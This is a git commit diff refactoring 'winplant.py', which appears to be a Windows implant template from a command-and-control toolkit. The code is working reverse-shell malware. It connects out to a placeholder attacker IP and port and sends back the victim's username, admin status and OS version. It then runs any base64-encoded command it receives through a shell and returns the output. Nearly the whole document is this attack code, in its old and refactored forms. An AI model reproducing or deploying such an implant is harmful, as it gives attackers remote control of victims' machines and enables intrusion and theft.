ef43152b97aac057990aad569b444e9cdb13d5d9
Jesse P Lesperance <jesse@jplesperance.me>
2023-06-01 23:27:18 -0700

    Refactored the winplant and linplant templates for efficiency

--- implant-templates/winplant.py
+++ implant-templates/winplant.py
@@ -8,48 +8,38 @@ from ctypes import *
 
 
 def session_handler(sock, target_ip, target_port):
-    try:
-        print(f'[+] Connecting to {target_ip}.')
-        sock.connect((target_ip, target_port))
-        outbound(sock, os.getlogin())
-        outbound(sock, windll.shell32.IsUserAnAdmin)
-        time.sleep(1)
-        op_sys = platform.uname()
-        op_sys = (f'{op_sys[0]} {op_sys[2]}')
-        outbound(sock, op_sys)
-        print(f'[+] Connected to {target_ip}.')
-        while True:
+    print(f'[+] Connecting to {target_ip}.')
+    sock.connect((target_ip, target_port))
 
-            message = inbound(sock)
-            print(f'[+] Message received - {message}')
-            if message == 'exit':
-                print('[-] The server has terminated the session.')
-                sock.close()
-                break
-            elif message == 'persist':
-                pass
-            if message.split(" ")[0] == 'cd':
-                change_directory(sock, message)
-            elif message == 'background':
-                pass
-            else:
-                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output = command.stdout.read() + command.stderr.read()
-                outbound(sock, output.decode())
-    except ConnectionRefusedError:
-        pass
+    outbound(sock, os.getlogin())
+    outbound(sock, windll.shell32.IsUserAnAdmin())
+    time.sleep(1)
+
+    op_sys = f'{platform.uname()[0]} {platform.uname()[2]}'
+    outbound(sock, op_sys)
+    print(f'[+] Connected to {target_ip}.')
+
+    while True:
+        message = inbound(sock)
+        print(f'[+] Message received - {message}')
+
+        if message == 'exit':
+            print('[-] The server has terminated the session.')
+            sock.close()
+            break
+        else:
+            process_message(sock, message)
 
 
 def process_message(sock, message):
+    if message == 'persist':
+        return
     if message.split(" ")[0] == 'cd':
         change_directory(sock, message)
     elif message == 'background':
-        pass
-    elif message == 'help':
-        pass
+        return
     else:
         execute_command(sock, message)
-        return
 
 
 def change_directory(sock, message):
@@ -59,48 +49,43 @@ def change_directory(sock, message):
         cur_dir = os.getcwd()
         print(f'[+] Changed to {cur_dir}')
         outbound(sock, cur_dir)
-        return
     except FileNotFoundError:
         outbound(sock, 'Invalid directory.  Try again.')
-        return
 
 
 def execute_command(sock, message):
-    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output = command.stdout.read() + command.stderr.read()
-    outbound(sock, output.decode())
-    return
+    try:
+        command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        output, error = command.communicate()
+        outbound(sock, output)
+    except Exception as e:
+        outbound(sock, str(e))
 
 
 def inbound(sock):
     print('[+] Awaiting response...')
-    message = ''
-    while True:
-        try:
-            message = sock.recv(1024).decode()
-            message = base64.b64decode(message).decode().strip()
-            return message
-        except Exception:
-            sock.close()
+    message = sock.recv(1024).decode()
+    message = base64.b64decode(message).decode().strip()
+    return message
 
 
 def outbound(sock, message):
     response = str(message)
-    response = base64.b64encode(bytes(response, encoding='utf-8'))
+    response = base64.b64encode(response.encode('utf-8'))
     sock.send(response)
 
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    target_ip = 'INPUT_IP_HERE'
+    target_port = INPUT_PORT_HERE
+
     try:
-        target_ip = 'INPUT_IP_HERE'
-        target_port = INPUT_PORT_HERE
         session_handler(sock, target_ip, target_port)
-    except IndexError:
-        print('[-] Command line argument(s) missing.  Please try again.')
-        return
     except Exception as e:
         print(e)
+    finally:
+        sock.close()
 
 
 if __name__ == '__main__':
